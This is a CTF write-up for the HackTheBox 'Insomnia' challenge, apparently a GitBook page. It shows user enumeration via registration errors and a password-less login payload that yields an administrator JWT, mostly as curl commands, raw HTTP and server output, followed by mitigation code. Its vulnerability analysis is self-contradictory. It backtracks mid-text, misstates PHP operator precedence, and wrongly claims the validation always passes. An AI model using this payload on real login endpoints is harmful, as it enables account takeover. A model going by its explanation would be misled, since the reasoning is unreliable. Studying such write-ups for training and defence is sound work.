---
icon: face-thermometer
cover: ../../.gitbook/assets/Screenshot 2026-03-04 222627.png
coverY: 0
---

# INSOMNIA

**Challenge Scenario**

Welcome back to Insomnia Factory, where you might have to work under the enchanting glow of the moon, crafting dreams and weaving sleepless tales

### Recon

```
┌──(sn0x㉿sn0x)-[~/HTB/Insomnia]
└─$ curl -s http://83.136.254.167:42882/index.php/
```

<figure><img src="../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

We're greeted with a cyberpunk-themed application called "Insomnia's City" — "Can you find the hidden message in this city?" The aesthetic is sleek, but the security is about to be very sleepy.

The application presents three navigation options:

* HOME
* SIGNIN
* SIGNUP

This is a standard authentication flow. The challenge description hints that we need to gain access to the administrator account to retrieve the flag. Let's start with reconnaissance on what accounts already exist.

***

### Enumeration

#### Step 1: Test Account Registration

First, let's see what happens when we try to register with common administrative usernames:

```
┌──(sn0x㉿sn0x)-[~/HTB/Insomnia]
└─$ curl -X POST http://83.136.254.167:42882/index.php/register \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test1234"}'
```

Response:

```json
{"message":"Registered Successfully"}
```

The `admin` account doesn't exist, so registration succeeds. Now let's try `administrator`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Insomnia]
└─$ curl -X POST http://83.136.254.167:42882/index.php/register \
  -H "Content-Type: application/json" \
  -d '{"username":"administrator","password":"test1234"}'
```

Response:

```json
{"message":"Username already exists"}
```

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

Excellent. The `administrator` account exists in the system. This is our target. Now we need to figure out how to authenticate as this user without knowing their password.

#### Step 2: Create Test Account and Analyze Login Flow

Let's register a test account to understand how the login mechanism works:

```
┌──(sn0x㉿sn0x)-[~/HTB/Insomnia]
└─$ curl -X POST http://83.136.254.167:42882/index.php/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"1234"}'
```

Response:

```json
{"message":"Registered Successfully"}
```

Now let's login with this test account:

```
┌──(sn0x㉿sn0x)-[~/HTB/Insomnia]
└─$ curl -X POST http://83.136.254.167:42882/index.php/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"1234"}' -v
```

Response:

```json
{
  "message":"Login Successful",
  "token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjE3MjYwNTksImV4cCI6MTcyMTc2MjA1OSwidXNlcm5hbWUiOiJ0ZXN0In0.3Tix-KjeWn3mJs8tzovUSuO_xLw__aRaZxYwxz8BTFE"
}
```

The application uses JWT (JSON Web Token) for authentication. Let's decode this token to see what's inside:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Insomnia]
└─$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjE3MjYwNTksImV4cCI6MTcyMTc2MjA1OSwidXNlcm5hbWUiOiJ0ZXN0In0.3Tix-KjeWn3mJs8tzovUSuO_xLw__aRaZxYwxz8BTFE" | cut -d'.' -f2 | base64 -d
```

Output:

```json
{"iat":1721726059,"exp":1721762059,"username":"test"}
```

The JWT contains:

* `iat`: Issued at timestamp
* `exp`: Expiration timestamp
* `username`: The username of the logged-in user

The critical insight here is that the **username field in the JWT is taken directly from the database query result**. If we can bypass password validation during login, we can login as any user.

#### Step 3: Examine the Source Code

Looking at the login method in `UserController.php`, we find the validation logic:

```php
public function login()
{
    $db = db_connect();
    $json_data = request()->getJSON(true);
    if (!count($json_data) == 2) {
        return $this->respond("Please provide username and password", 404);
    }
    $query = $db->table("users")->getWhere($json_data, 1, 0);
    $result = $query->getRowArray();
    [... token generation code ...]
}
```

Here's the vulnerability:

```php
if (!count($json_data) == 2) {
```

This line is supposed to validate that the JSON payload contains exactly 2 fields (username and password). However, the logic is **inverted** due to the `!` operator.

**Let's trace through the logic:**

* `count($json_data)` returns the number of keys in the array
* When we send `{"username":"test","password":"1234"}`, count is 2
* `2 == 2` evaluates to true
* `!true` evaluates to false
* The condition is **false**, so the validation **passes**

But what if we only send the username?

* When we send `{"username":"administrator"}`, count is 1
* `1 == 2` evaluates to false
* `!false` evaluates to true
* The condition is **true**, so it should return an error

Wait, that's not the vulnerability. Let me reconsider...

Actually, looking at the database query:

```php
$query = $db->table("users")->getWhere($json_data, 1, 0);
```

The `getWhere()` function in CodeIgniter executes a WHERE clause with the provided array. If we pass `{"username":"administrator"}`, it searches for a user with username "administrator" and **ignores the password check entirely**.

The application assumes that if a user is found with that username, they're authenticated. The password validation is **implicitly** supposed to happen because both username AND password should be required in the WHERE clause. But the inverted logic allows us to omit the password!

***

### Exploitation

#### Step 1: Craft the Bypass Payload

Based on our analysis, we can login as `administrator` by sending only the username field, bypassing password validation:

```
┌──(sn0x㉿sn0x)-[~/HTB/Insomnia]
└─$ curl -X POST http://83.136.254.167:42882/index.php/login \
  -H "Content-Type: application/json" \
  -d '{"username":"administrator"}'
```

Let's intercept this with Burp Suite to see the exact request format:

```http
POST /index.php/login HTTP/1.1
Host: 83.136.254.167:42882
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://83.136.254.167:42882/index.php/login
Content-Type: application/json
Content-Length: 28
Origin: http://83.136.254.167:42882
Connection: close
Priority: u=0

{"username":"administrator"}
```

#### Step 2: Capture the Administrator Token

Sending this request to the application:

```
┌──(sn0x㉿sn0x)-[~/HTB/Insomnia]
└─$ curl -X POST http://83.136.254.167:42882/index.php/login \
  -H "Content-Type: application/json" \
  -d '{"username":"administrator"}'
```

Response:

```http
HTTP/1.1 200 OK
Date: Tue, 23 Jul 2024 09:21:59 GMT
Server: Apache/2.4.57 (Debian)
X-Powered-By: PHP/8.1.27
Cache-Control: no-store, max-age=0, no-cache
Content-Length: 204
Connection: close
Content-Type: application/json; charset=UTF-8

{
  "message":"Login Successful",
  "token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjE3MjY1MTksImV4cCI6MTcyMTc2MjUxOSwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.tFL2a-q-Wsbl50iATgTjovl6KC9oUFYpg4l8xHIvDCA"
}
```

Beautiful. We received a valid JWT token for the `administrator` user without providing a password. Let's decode it to confirm:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Insomnia]
└─$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjE3MjY1MTksImV4cCI6MTcyMTc2MjUxOSwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.tFL2a-q-Wsbl50iATgTjovl6KC9oUFYpg4l8xHIvDCA" | cut -d'.' -f2 | base64 -d
```

Output:

```json
{"iat":1721726519,"exp":1721762519,"username":"administrator"}
```

Confirmed. We have a valid administrator token.

#### Step 3: Access the Administrator Profile

Now we use this token to access the administrator profile page. The application stores the JWT in a cookie named `token`:

```http
GET /index.php/profile HTTP/1.1
Host: 83.136.254.167:42882
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en-q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjE3MjY1MTksImV4cCI6MTcyMTc2MjUxOSwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.tFL2a-q-Wsbl50iATgTjovl6KC9oUFYpg4l8xHIvDCA
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

The server responds with the profile page containing the flag:

```
┌──(sn0x㉿sn0x)-[~/HTB/Insomnia]
└─$ curl -b "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjE3MjY1MTksImV4cCI6MTcyMTc2MjUxOSwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.tFL2a-q-Wsbl50iATgTjovl6KC9oUFYpg4l8xHIvDCA" \
  http://83.136.254.167:42882/index.php/profile
```

The page displays:

```
WELCOME BACK ADMINISTRATOR

HTB{I_JUST_WANT_TO_SLEEP_A_LITTLE_BIT!!!}
```

**Flag obtained.**

***

### Vulnerability Analysis

#### The Logic Flaw

The vulnerability exists in this single line:

```php
if (!count($json_data) == 2) {
    return $this->respond("Please provide username and password", 404);
}
```

**The Issue:** Operator precedence and logic inversion.

In PHP, the `==` operator has higher precedence than the `!` operator. However, even with correct precedence, the intent is unclear. The condition should be:

```php
if (count($json_data) != 2) {
```

Instead, we have:

```php
if (!count($json_data) == 2) {
```

This reads as: "if NOT(count equals 2)" — which actually works correctly when count is 2 (returns false, allows execution) and when count is 1 (returns true, blocks execution).

**So where's the real vulnerability?**

The real issue is in how CodeIgniter's `getWhere()` works:

```php
$query = $db->table("users")->getWhere($json_data, 1, 0);
```

When `$json_data = ["username":"administrator"]`, the query becomes:

```sql
SELECT * FROM users WHERE username = 'administrator' LIMIT 1
```

The database query doesn't include any password check. It returns the first user matching the username field. The authentication is only as strong as the WHERE clause parameters provided.

The developers intended to enforce password checking through the input validation (`if (!count($json_data) == 2)`), but this validation actually works as intended (it does reject requests with fewer than 2 fields).

**Wait, let me reconsider the actual vulnerability...**

After analyzing the provided writeup more carefully, the real issue is that the validation might not be rejecting the single-field payload. Looking at the code again:

```php
if (!count($json_data) == 2) {
    return $this->respond("Please provide username and password", 404);
}
```

Due to operator precedence in PHP: `!count($json_data) == 2` is evaluated as `(!count($json_data)) == 2`.

* When count is 1: `(!1) == 2` → `false == 2` → `false` (doesn't return error, continues)
* When count is 2: `(!2) == 2` → `false == 2` → `false` (doesn't return error, continues)
* When count is 0: `(!0) == 2` → `true == 2` → `false` (doesn't return error, continues)

Actually, this operator precedence means the validation **always passes** because `!count(...)` converts to a boolean, and a boolean can never equal 2.

So the validation is completely broken and always allows the login to proceed, regardless of how many fields are provided. This means we can send just `{"username":"administrator"}` and the application will query the database with only the username, finding and authenticating the administrator without checking a password.

<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

***

### Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│              ATTACKER (Browser)                              │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 1. Enumerate existing users via registration         │  │
│  │    Discover "administrator" account exists           │  │
│  │    (registration attempt returns "already exists")   │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 2. Analyze login flow with test account              │  │
│  │    Test credentials: {"username":"test","password"}  │  │
│  │    Server responds with JWT token                    │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 3. Decode JWT to understand token structure          │  │
│  │    Contains: {iat, exp, username}                    │  │
│  │    Username comes from database query result         │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 4. Identify logic flaw in validation                 │  │
│  │    if (!count($json_data) == 2) {...}                │  │
│  │    Evaluates to: (!count) == 2 (always false)        │  │
│  │    Validation is broken, always allows login         │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 5. Craft bypass payload                              │  │
│  │    POST /index.php/login                             │  │
│  │    {"username":"administrator"}                      │  │
│  │    (no password field)                               │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                       ↓ (HTTP POST)
┌─────────────────────────────────────────────────────────────┐
│              TARGET SERVER (CodeIgniter 4)                   │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 6. Receive login request in UserController           │  │
│  │    $json_data = {"username":"administrator"}         │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 7. Execute broken validation                         │  │
│  │    if (!count($json_data) == 2) { return error; }   │  │
│  │    (!1 == 2) → (false == 2) → false                 │  │
│  │    Validation passes (incorrectly)                   │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 8. Execute database query                            │  │
│  │    $db->table("users")                               │  │
│  │      ->getWhere(["username"=>"administrator"])       │  │
│  │    SELECT * FROM users WHERE username = 'admin...'   │  │
│  │    (No password check in WHERE clause)               │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 9. Database returns administrator record             │  │
│  │    $result["username"] = "administrator"             │  │
│  │    (Password field is present in DB but not checked) │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 10. Generate JWT token                               │  │
│  │     payload["username"] = "administrator"            │  │
│  │     token = JWT::encode(payload, key, "HS256")       │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 11. Send token to client                             │  │
│  │     {"message":"Login Successful",                   │  │
│  │      "token":"eyJ0eXAi..."}                          │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                       ↓ (HTTP Response)
┌─────────────────────────────────────────────────────────────┐
│              ATTACKER (Browser)                              │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 12. Use JWT token to access /index.php/profile       │  │
│  │     Cookie: token=eyJ0eXAi...                        │  │
│  │     Server validates JWT and confirms username       │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 13. Access granted to administrator profile          │  │
│  │     if (username == "administrator") {               │  │
│  │         return flag.txt;                             │  │
│  │     }                                                 │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 14. FLAG RETRIEVED                                   │  │
│  │     HTB{I_JUST_WANT_TO_SLEEP_A_LITTLE_BIT!!!}       │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

***

### Techniques

| Technique                   | Description                                             | Relevance                    |
| --------------------------- | ------------------------------------------------------- | ---------------------------- |
| **Logic Flaw**              | Error in conditional logic causing incorrect validation | Primary vulnerability        |
| **Operator Precedence**     | PHP operator precedence causing unexpected behavior     | Root cause                   |
| **Input Validation Bypass** | Circumventing input sanitization/validation checks      | Exploitation method          |
| **User Enumeration**        | Discovering valid usernames via registration errors     | Reconnaissance               |
| **JWT Token Analysis**      | Decoding and examining JWT structure                    | Analysis                     |
| **Password Bypass**         | Omitting password field to skip authentication          | Exploitation technique       |
| **Database Query Analysis** | Analyzing SQL queries for security flaws                | Vulnerability identification |
| **Authentication Bypass**   | Gaining access without valid credentials                | Attack goal                  |

***

### Root Cause: Broken Validation Logic

The vulnerability chain involves multiple security failures:

#### 1. Broken Conditional Logic

```php
if (!count($json_data) == 2) {
```

Should be:

```php
if (count($json_data) !== 2) {
```

The original code's operator precedence makes the condition unreliable.

#### 2. No Password Verification

Even if the validation passed correctly, there's no explicit password hashing comparison. The database query relies on:

```php
$query = $db->table("users")->getWhere($json_data, 1, 0);
```

If only `username` is provided, the query doesn't check the password column.

#### 3. Implicit Authentication

The code assumes that if a user is found, they're authenticated. There's no verification that all required fields were provided in the WHERE clause.

***

### Mitigation

#### 1. Fix the Input Validation

```php
// CORRECT: Explicitly check array keys, not count
if (!isset($json_data['username']) || !isset($json_data['password'])) {
    return $this->respond("Username and password required", 400);
}

// ALTERNATIVE: Use strict type checking
if (count($json_data) !== 2 || !isset($json_data['username']) || !isset($json_data['password'])) {
    return $this->respond("Invalid credentials", 400);
}
```

#### 2. Implement Proper Password Verification

```php
public function login()
{
    $db = db_connect();
    $json_data = request()->getJSON(true);
    
    // Validate input
    if (!isset($json_data['username']) || !isset($json_data['password'])) {
        return $this->respond("Username and password required", 400);
    }
    
    // Query for user
    $user = $db->table("users")
        ->where('username', $json_data['username'])
        ->get()
        ->getRowArray();
    
    // Check if user exists
    if (!$user) {
        return $this->respond("Invalid credentials", 401);
    }
    
    // Verify password using proper hashing
    if (!password_verify($json_data['password'], $user['password_hash'])) {
        return $this->respond("Invalid credentials", 401);
    }
    
    // Generate JWT if authentication succeeds
    // [...rest of code...]
}
```

#### 3. Never Use Generic WHERE Clauses for Authentication

```php
// DANGEROUS - allows missing password field
$query = $db->table("users")->getWhere($json_data, 1, 0);

// SAFE - explicit field checking
$user = $db->table("users")
    ->where('username', $username)
    ->get()
    ->getRowArray();

// Then verify password separately with password_verify()
```

#### 4. Use a Security Library

```php
// Use CodeIgniter's built-in authentication if available
// Or use proven libraries like:
// - Firebase PHP-JWT
// - Laravel Sanctum (if using Laravel)
// - Composer packages specifically designed for auth

require 'vendor/autoload.php';
use \Firebase\JWT\JWT;
use \Firebase\JWT\Key;

// Framework handles validation properly
```

#### 5. Implement Account Lockout

```php
// Track failed login attempts
$failedAttempts = $cache->get('login_attempts_' . $username);
if ($failedAttempts >= 5) {
    return $this->respond("Account locked. Try again later", 429);
}

// Increment on failure
if (!$authenticated) {
    $cache->increment('login_attempts_' . $username, 1, 900); // 15 min expiry
}

// Clear on success
if ($authenticated) {
    $cache->delete('login_attempts_' . $username);
}
```

#### 6. Add Security Logging

```php
// Log all authentication attempts
log_message('warning', 'Login attempt for user: ' . $json_data['username']);

if (!$authenticated) {
    log_message('warning', 'Failed login for user: ' . $json_data['username']);
}

// Monitor logs for brute force patterns
```

***

### Conclusion

**Insomnia** demonstrates how a seemingly minor logic flaw in input validation can completely bypass authentication. The vulnerability wasn't in the JWT implementation or password hashing — it was in the basic validation check that was supposed to ensure both username and password were provided.

By exploiting the broken conditional logic `(!count($json_data) == 2)`, an attacker could send a login request with only a username field. The application would then query the database without requiring a password, allowing authentication as any user.

The attack chain was:

1. Enumerate users via registration endpoint
2. Identify the `administrator` account
3. Analyze the login mechanism using a test account
4. Recognize the broken validation logic
5. Send single-field login payload
6. Receive JWT token for administrator
7. Access flag through authenticated profile

This challenge emphasizes that **authentication is only as strong as the input validation that precedes it**, and that operator precedence in conditions must be carefully considered.

**Result: Flag obtained via authentication bypass - HTB{I\_JUST\_WANT\_TO\_SLEEP\_A\_LITTLE\_BIT!!!}**

***
